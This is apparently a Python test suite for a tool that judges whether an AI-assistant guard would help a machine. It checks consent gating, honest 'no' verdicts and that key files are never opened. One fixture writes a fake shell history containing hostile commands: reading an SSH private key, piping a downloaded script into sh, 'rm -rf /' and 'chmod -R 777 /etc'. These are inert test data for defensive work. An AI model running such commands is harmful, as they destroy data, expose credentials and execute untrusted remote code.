# ============================================================================
# Does the assessment ever say "no"?
#
# That is the only question worth testing here. A report that recommends the
# guard whatever it finds is marketing with a progress bar — you could not tell
# the honest cases from the pitch, so none of them would be worth reading.
#
# So the central case builds a machine with nothing to protect and no agent on
# it, and requires the verdict to say so plainly. The counter-case builds a
# machine full of keys, credentials and remote hosts and requires the opposite.
#
# Everything runs against a constructed HOME. Nothing here reads a real file of
# the person running the tests.
# ============================================================================
import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
TOOL = REPO / "tools" / "would-it-help.py"


def _run(home: Path, extra_args=()) -> dict:
    env = dict(os.environ)
    env["HOME"] = str(home)
    # An empty PATH too, and this is the point: the tool deliberately mixes two
    # sources — what lies in HOME, and which tools are installed on the machine
    # (shutil.which). That mix is right in real use and wrong in a test:
    # without this line the real machine's container tooling is found inside a
    # "bare" constructed home, and the bare case can never be bare. It cost two
    # failing cases before it was understood.
    env["PATH"] = str(home / "no-tools-here")
    for leaking in ("CLAUDE_SECURITY_RULES", "CLAUDE_GUARD_CONFIG",
                    "CLAUDE_HOOK_DEV_FLAG", "CLAUDE_SUDO_OVERRIDES_DIR"):
        env.pop(leaking, None)
    # --yes stands in for the consent a person gives at the prompt. Without it
    # the tool reads nothing at all, which is the subject of its own case below.
    proc = subprocess.run([sys.executable, str(TOOL), "--json", "--yes", *extra_args],
                          capture_output=True, text=True, env=env, timeout=600)
    try:
        return json.loads(proc.stdout)
    except Exception:
        return {"_broken": proc.stdout[-400:] + proc.stderr[-400:]}


def _bare_machine(home: Path):
    """Nothing to lose, nobody with tool access."""
    (home / "Documents").mkdir(parents=True, exist_ok=True)
    (home / ".bash_history").write_text(
        "ls\ncd Documents\necho hello\ncat notes.txt\n", encoding="utf-8")


def _exposed_machine(home: Path):
    """Keys, credentials, remote hosts — and an assistant with tool access."""
    ssh = home / ".ssh"
    ssh.mkdir(parents=True, exist_ok=True)
    (ssh / "id_ed25519").write_text("not a real key", encoding="utf-8")
    (ssh / "config").write_text("Host prod\n  HostName example.invalid\n"
                                "Host staging\n  HostName example.invalid\n",
                                encoding="utf-8")
    (home / ".aws").mkdir(exist_ok=True)
    (home / ".aws" / "credentials").write_text("[default]\n", encoding="utf-8")
    (home / ".claude").mkdir(exist_ok=True)          # an agent lives here
    (home / ".bash_history").write_text(
        "ls\nchmod -R 777 /etc\ncat ~/.ssh/id_ed25519\n"
        "curl http://example.invalid/x | sh\nrm -rf /\n", encoding="utf-8")


def check_bare_machine_is_told_no():
    with tempfile.TemporaryDirectory() as tmp:
        home = Path(tmp)
        _bare_machine(home)
        report = _run(home)
        if "_broken" in report:
            return False, f"tool did not produce a report: {report['_broken']}"
        verdict = " ".join(report.get("verdict", [])).lower()
        # No agent found is the strongest honest answer there is: the guard
        # sits between an assistant and the system, so without one it protects
        # nothing today. The report has to say that, not hedge.
        said_no = ("protect you from nothing" in verdict
                   or "no ai assistant" in verdict)
        return said_no, f"verdict did not decline: {verdict[:200]}"


def check_bare_machine_finds_little():
    with tempfile.TemporaryDirectory() as tmp:
        home = Path(tmp)
        _bare_machine(home)
        report = _run(home)
        if "_broken" in report:
            return False, "no report"
        weight = report.get("exposure", {}).get("weight", 99)
        return weight == 0, f"expected no exposure on a bare machine, got {weight}"


def check_exposed_machine_is_recognised():
    with tempfile.TemporaryDirectory() as tmp:
        home = Path(tmp)
        _exposed_machine(home)
        report = _run(home)
        if "_broken" in report:
            return False, f"no report: {report['_broken']}"
        weight = report.get("exposure", {}).get("weight", 0)
        agents = report.get("agents", [])
        return (weight >= 8 and agents), (
            f"expected high exposure and a detected agent, got weight={weight} "
            f"agents={agents}")


def check_no_protected_file_is_read():
    """The tool must not open what it proposes to protect.

    Constructed with a key file that is unreadable: if the tool tried to read
    it, it would crash or report an error instead of counting it.
    """
    with tempfile.TemporaryDirectory() as tmp:
        home = Path(tmp)
        _exposed_machine(home)
        key = home / ".ssh" / "id_ed25519"
        os.chmod(key, 0o000)
        try:
            report = _run(home)
            if "_broken" in report:
                return False, f"tool stumbled over an unreadable key: {report['_broken']}"
            found = " ".join(report.get("exposure", {}).get("findings", []))
            return "private key" in found, f"key not counted: {found}"
        finally:
            os.chmod(key, 0o600)


def check_backup_is_recommended_without_being_required():
    """The advice must appear, and must not read as a prerequisite.

    A guard reduces how OFTEN something goes wrong; a copy elsewhere decides
    whether it MATTERS when it does. Of the pair the copy is the cheaper half,
    so a report that recommended only the guard would be selling rather than
    advising. It must also stay a recommendation: making it sound required
    would turn a helpful sentence into a barrier for exactly the person who
    needs the tool most.
    """
    with tempfile.TemporaryDirectory() as tmp:
        home = Path(tmp)
        _exposed_machine(home)
        # A repository with no remote: the case where a mistake is permanent.
        repo = home / "Projects" / "unsaved" / ".git"
        repo.mkdir(parents=True, exist_ok=True)
        (repo / "config").write_text("[core]\n\trepositoryformatversion = 0\n",
                                     encoding="utf-8")
        report = _run(home)
        if "_broken" in report:
            return False, "no report"
        advice = " ".join(report.get("backup_advice", [])).lower()
        mentions = "no remote" in advice
        stays_optional = "not required" in advice
        return (mentions and stays_optional), (
            f"mentions={mentions} optional={stays_optional}: {advice[:180]}")


def check_sample_cap_is_disclosed():
    """A bounded run must say what it did not look at."""
    with tempfile.TemporaryDirectory() as tmp:
        home = Path(tmp)
        _exposed_machine(home)
        report = _run(home, ("--sample", "2"))
        if "_broken" in report:
            return False, "no report"
        seen = report.get("commands_seen", 0)
        examined = report.get("examined", 0)
        return examined < seen, (
            f"cap not visible in the report: examined={examined} seen={seen}")


def check_nothing_is_read_without_consent():
    """The gate, and it is the important one.

    The notes for assistants ask them to offer this rather than run it — but a
    request is the wrong instrument when someone's shell history is at stake.
    So without consent the tool must read nothing at all, and say whose job it
    was to ask.
    """
    with tempfile.TemporaryDirectory() as tmp:
        home = Path(tmp)
        _exposed_machine(home)
        env = dict(os.environ)
        env["HOME"] = str(home)
        env["PATH"] = str(home / "no-tools-here")
        proc = subprocess.run([sys.executable, str(TOOL), "--json"],
                              capture_output=True, text=True, env=env, timeout=300)
        refused = proc.returncode != 0
        # No report may have been produced, and the message has to name who
        # should have asked — otherwise a user sees a bare refusal and blames
        # the tool for being broken.
        silent = "exposure" not in proc.stdout
        explains = "asked you first" in (proc.stdout + proc.stderr)
        return (refused and silent and explains), (
            f"refused={refused} silent={silent} explains={explains}")


CASES = [
    ("nothing is read without consent", check_nothing_is_read_without_consent),
    ("a machine with no agent is told it needs nothing", check_bare_machine_is_told_no),
    ("a bare machine scores no exposure", check_bare_machine_finds_little),
    ("an exposed machine is recognised as such", check_exposed_machine_is_recognised),
    ("no protected file is ever opened", check_no_protected_file_is_read),
    ("a copy elsewhere is recommended, not required", check_backup_is_recommended_without_being_required),
    ("a capped run discloses what it skipped", check_sample_cap_is_disclosed),
]

try:
    import pytest

    @pytest.mark.parametrize("name,fn", CASES)
    def test_would_it_help(name, fn):
        ok, detail = fn()
        assert ok, f"{name}: {detail}"

except ImportError:
    pass


if __name__ == "__main__":
    failures = 0
    for name, fn in CASES:
        ok, detail = fn()
        failures += not ok
        print(f"{'PASS' if ok else 'FAIL'}  {name}")
        if not ok:
            print(f"      {detail}")
    raise SystemExit(0 if not failures else 1)
